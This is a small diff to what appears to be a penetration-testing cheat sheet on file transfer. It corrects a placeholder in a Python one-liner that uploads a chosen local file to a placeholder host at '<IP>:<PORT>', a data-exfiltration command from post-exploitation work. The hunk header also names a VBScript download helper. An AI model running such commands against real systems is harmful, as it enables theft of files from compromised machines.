@@ -94,5 +94,5 @@ cscript.exe /nologo wget.vbs
 
 ## Oneliner to upload files python
 ```bash
-python3 -c 'import requests;requests.post("http://<IP>:<PORT>/upload",files={"files":open("<","rb")})'
+python3 -c 'import requests;requests.post("http://<IP>:<PORT>/upload",files={"files":open("<PATH OF FILE TO UPLOAD>","rb")})'
 ```
